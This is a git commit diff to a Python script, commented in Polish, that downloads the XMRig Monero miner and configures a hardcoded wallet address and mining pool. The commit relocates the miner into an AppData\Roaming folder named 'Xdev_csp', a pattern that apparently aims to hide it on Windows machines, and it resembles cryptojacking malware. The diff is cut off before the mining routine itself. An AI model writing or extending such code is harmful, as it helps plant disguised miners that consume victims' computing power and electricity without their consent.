c71d9597c3fe9b2ecb0ee9a156f99c521b09dce3
ex0my <THELEMAMaster@proton.me>
2025-04-18 15:37:11 +0200

    Update TSTSTS.py

--- TSTSTS.py
+++ TSTSTS.py
@@ -4,18 +4,24 @@ import urllib.request
 import zipfile
 
 XMRIG_URL = "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-gcc-win64.zip"
-XMRIG_DIR = "xmrig"
+APPDATA_DIR = os.path.join(os.getenv('APPDATA'), "Xdev_csp")  # Folder AppData\Roaming\Xdev_csp
+XMRIG_DIR = os.path.join(APPDATA_DIR, "xmrig")  # Zmieniamy lokalizację katalogu xmrig
+ZIP_PATH = os.path.join(APPDATA_DIR, "xmrig.zip")  # Ścieżka do pliku zip w folderze Xdev_csp
 WALLET_ADDRESS = "445bUC8JDoqhgeSfmXBvSm4C7PDCP165Y4tbFxfQ8qm9JYDK6Z2Vr6mFnpMA3kQdwtV7CDSj4jqsjM4TBfgoWsnaHLd54zU"
 POOL = "gulf.moneroocean.stream:10128"  # możesz zmienić na inny pool
 WORKER_NAME = "my_windows_rig"
 
 def download_and_extract_xmrig():
+    if not os.path.exists(APPDATA_DIR):
+        print(f"[+] Tworzę folder: {APPDATA_DIR}")
+        os.makedirs(APPDATA_DIR)
+    
     if not os.path.exists(XMRIG_DIR):
         print("[+] Pobieranie XMRig...")
-        urllib.request.urlretrieve(XMRIG_URL, "xmrig.zip")
+        urllib.request.urlretrieve(XMRIG_URL, ZIP_PATH)  # Zmieniamy ścieżkę pliku zip
         print("[+] Rozpakowywanie...")
-        with zipfile.ZipFile("xmrig.zip", 'r') as zip_ref:
-            zip_ref.extractall(XMRIG_DIR)
+        with zipfile.ZipFile(ZIP_PATH, 'r') as zip_ref:
+            zip_ref.extractall(XMRIG_DIR)  # Rozpakowujemy do zmienionego folderu
         print("[+] Gotowe.")
 
 def start_mining():
